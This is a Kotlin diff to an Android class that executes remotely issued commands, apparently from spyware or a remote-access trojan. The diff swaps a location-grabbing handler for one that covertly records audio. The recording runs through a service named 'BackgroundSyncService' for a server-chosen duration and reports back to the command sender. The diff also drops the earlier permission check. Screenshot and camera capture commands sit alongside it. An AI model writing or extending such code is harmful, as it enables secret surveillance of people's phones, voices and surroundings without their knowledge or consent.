@@ -30,7 +30,7 @@ class Commands(private val context: Context) {
     private val commandHandlers = mapOf<String, (JSONObject) -> Unit>(
         "capture_screenshot" to ::handleCaptureScreenshotCommand,
         "capture_camera" to ::handleCaptureCameraCommand,
-        "get_location" to ::handleGetLocationCommand
+        "get_audio" to ::handleCaptureAudioCommand
     )
 
     fun initialize() {
@@ -129,8 +129,6 @@ class Commands(private val context: Context) {
             }
 
             Log.d(TAG, "Processing command: $commandType, ID: $commandId")
-
-            // Store command type for later use in responses
             if (commandId.isNotEmpty()) {
                 commandTypes[commandId] = commandType
             }
@@ -149,7 +147,6 @@ class Commands(private val context: Context) {
     }
 
     fun sendCommandResponse(commandId: String, success: Boolean, message: String, result: JSONObject? = null) {
-        // Implementation remains the same
         executor.execute {
             try {
                 val responseData = JSONObject().apply {
@@ -253,34 +250,28 @@ class Commands(private val context: Context) {
         }
     }
 
-    private fun handleGetLocationCommand(command: JSONObject) {
-        // Implementation remains the same
+    private fun handleCaptureAudioCommand(command: JSONObject) {
         try {
             val commandId = command.optString("id")
+            val duration = command.optInt("duration", 30) // Default 30 seconds
 
-            // Check location permissions
-            if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
-                ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-
-                val result = JSONObject().apply {
-                    put("message", "Location permissions not granted")
-                    put("status", "error")
-                }
-                sendCommandResponse(commandId, false, "Location permissions not granted", result)
-                return
+            // Send initial response that we're processing the command
+            val result = JSONObject().apply {
+                put("message", "Audio recording initiated")
+                put("status", "pending")
             }
+            sendCommandResponse(commandId, true, "Audio recording requested", result)
 
-            val locationTracker = LocationTracker.getInstance(context)
-            locationTracker.captureLastKnownLocation { locationData ->
-                try {
-                    sendCommandResponse(commandId, true, "Location captured", locationData)
-                } catch (e: Exception) {
-                    Log.e(TAG, "Error sending location response: ${e.message}")
-                    sendCommandResponse(commandId, false, "Error: ${e.message}")
-                }
-            }
+            // Send intent to BackgroundSyncService to handle the recording
+            val intent = android.content.Intent(context, BackgroundSyncService::class.java)
+            intent.action = "CAPTURE_AUDIO"
+            intent.putExtra("command_id", commandId)
+            intent.putExtra("duration", duration)
+            context.startService(intent)
+
+            Log.d(TAG, "Audio recording request sent to service")
         } catch (e: Exception) {
-            Log.e(TAG, "Error executing get_location command: ${e.message}")
+            Log.e(TAG, "Error executing capture_audio command: ${e.message}")
             sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
         }
     }
